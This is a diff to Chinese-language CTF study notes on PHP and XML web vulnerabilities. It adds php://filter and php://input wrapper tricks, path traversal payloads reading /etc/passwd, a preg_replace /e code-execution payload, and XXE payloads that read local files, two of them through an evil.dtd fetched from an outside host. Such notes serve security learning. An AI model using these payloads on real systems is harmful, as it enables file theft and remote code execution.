@@ -1,3 +1,5 @@
+
+
 # PHP
 
 * ## 基础
@@ -22,7 +24,7 @@ php伪协议：
 
 ```
 php://input  //通过post方法将原数据远程上传至服务器
-php://filter //通过一些过滤将原数据进行一些操作后下载
+php://filter //通过一些过滤将原数据进行一些操作后下载（可以嵌套一层别的协议）如/index/
 ?file=php://filter/read=convert.base64-encode/resource=flag.php
         //将flag.php内部源码进行base64编码后给file赋值
 ```
@@ -177,6 +179,130 @@ payload：
 ?target=db_sql.php%253f/../../../../../../../../etc/passwd
 ?target=db_sql.php%253f/../../../../../../../../flag
 ```
+
+实例：
+
+```
+$text = $_GET["text"];
+file_get_contents($text,'r')==="I have a dream"     //形如该种判断语句采用php伪协议php://input进行传值
+```
+
+* ### preg_replace 漏洞：
+
+```
+preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str)          //preg_replace 的 /e 模式存在RCE
+```
+
+payload：
+
+```
+/?.*={${phpinfo()}}    //phpinfo()可替换为任意想要执行的代码
+\S*=${phpinfo()}
+```
+
+
+
+* ## XML注入（构造恶意对象）
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xxe[
+    <!ENTITY abc SYSTEM "file:///flag">
+    ]>
+<user><username>&abc;</username><password>a</password></user>
+```
+
+* 原理：XML基础知识
+  XML基础架构：
+
+* ```
+  <?xml version="1.0" encoding="UTF-8"?>  //XML声明
+  
+  <!DOCTYPE a[
+  	<!ELEMENT note (to,from,heading,body)>
+  	<!ELEMENT to      (#PCDATA)>
+  	<!ELEMENT from    (#PCDATA)>
+  	<!ELEMENT heading (#PCDATA)>
+  	<!ELEMENT body    (#PCDATA)>
+  ]>						//DTD文档类型定义（可选）
+  
+  <note>
+  <to>George</to>
+  <from>John</from>
+  <heading>reminder</heading>
+  <body>Don't forget the meeting!</body>
+  </note>					//文档元素
+  ```
+
+* 内部声明DTD：
+
+  根元素 [元素声明]>
+
+* 引用外部DTD
+
+  根元素 SYSTEM "文件名">
+
+  或
+
+  根元素 PUBLIC "public_ID" "文件名">
+
+* 内部声明实体
+
+  实体名称 "实体的值">
+
+* 引用外部实体
+
+  实体名称 SYSTEM "URI">
+
+  或
+
+  实体名称 PUBLIC "public_ID" "URI">
+
+* 恶意引入外部实体1：
+
+* ```
+  <?xml version="1.0"?>
+  <!DOCTYPE a[
+  	<!ENTITY b SYSTEM "file:///flag">
+  ]>
+  <c>&b;</c>
+  ```
+
+* 恶意引入外部实体2：
+
+* ```
+  <?xml version="1.0"?>
+  <!DOCTYPE a[
+  	<!ENTITY % d SYSTEM "http://mark4z5.com/evil.dtd">
+  	%d;
+  ]>
+  <c>&b;</c>
+  ```
+
+  其中DTD文件（evil.dtd）内容：
+
+  ```
+  <!ENTITY b SYSTEM "file:///flag">
+  ```
+
+* 恶意引入外部实体3：
+  
+* ```
+  <?xml version="1.0"?>
+  <!DOCTYPE a SYSTEM "http://mark4z5.com/evil.dtd">
+  <c>&b;</c>
+  ```
+  
+
+
+* ## Unicode编码
+
+* Unicode安全编码：可以通过一个字符代表数字
+
+* ==> 亿 = 100000000.0
+
+* ## Extract 变量赋值漏洞
+
+
 
 
 
